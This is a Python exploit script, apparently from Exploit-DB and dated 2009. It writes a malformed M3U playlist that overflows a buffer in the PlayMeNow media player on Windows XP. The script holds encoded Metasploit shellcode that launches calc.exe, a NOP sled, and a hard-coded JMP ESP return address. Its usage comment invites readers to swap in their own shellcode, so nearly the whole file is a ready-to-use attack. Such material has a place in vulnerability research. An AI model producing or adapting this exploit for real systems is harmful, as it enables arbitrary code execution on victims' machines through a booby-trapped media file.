#!/usr/bin/python

# Vulnerability:        	PlayMeNow Malformed M3U Playlist WinXP Universal BoF
# Product:			PlayMeNow - media player.
# Versions affected:     	Tested with 7.3 and 7.4
# Tested on:              	Windows XP Pro SP2/3 & Home SP3
# Author:                 	loneferret
# Original Author:    	Gr33nG0bL1n
# Reference:			http://www.exploit-db.com/exploits/10556
# Date: 19/12/2009
# Usage: Just choose your shellcode and open the created file(PlayMeNow_expl.m3u) with PlayMeNow.

# The offset is 1040, but the return address used brings us into it. So the shellcode is part of our
# offset buffer. Also, yes the return address does contain \x00. If you want to put in a bigger payload
# play around with the first & second set of As and those nops.

buffer = "\x41" * 465
buffer += "\x90" * 110

#win32_exec -  
#EXITFUNC=thread 
#CMD=calc.exe Size=164 Encoder=PexFnstenvSub 
#http://metasploit.com */
buffer +=("\x33\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc4"
"\x5b\x35\x61\x83\xeb\xfc\xe2\xf4\x38\xb3\x71\x61\xc4\x5b\xbe\x24"
"\xf8\xd0\x49\x64\xbc\x5a\xda\xea\x8b\x43\xbe\x3e\xe4\x5a\xde\x28"
"\x4f\x6f\xbe\x60\x2a\x6a\xf5\xf8\x68\xdf\xf5\x15\xc3\x9a\xff\x6c"
"\xc5\x99\xde\x95\xff\x0f\x11\x65\xb1\xbe\xbe\x3e\xe0\x5a\xde\x07"
"\x4f\x57\x7e\xea\x9b\x47\x34\x8a\x4f\x47\xbe\x60\x2f\xd2\x69\x45"
"\xc0\x98\x04\xa1\xa0\xd0\x75\x51\x41\x9b\x4d\x6d\x4f\x1b\x39\xea"
"\xb4\x47\x98\xea\xac\x53\xde\x68\x4f\xdb\x85\x61\xc4\x5b\xbe\x09"
"\xf8\x04\x04\x97\xa4\x0d\xbc\x99\x47\x9b\x4e\x31\xac\xb4\xfb\x81"
"\xa4\x33\xad\x9f\x4e\x55\x62\x9e\x23\x38\x54\x0d\xa7\x75\x50\x19"
"\xa1\x5b\x35\x61")

buffer += "\x41" * 301		# end of our 1040 byte
buffer += "\x8c\x92\x5b\x00" 	# 0x005B928C JMP ESP @ autorun.exe
buffer += "\xCC" * 2800		# junk

file=open('playmenow.m3u','w')
file.write(buffer)				# write file
file.close()
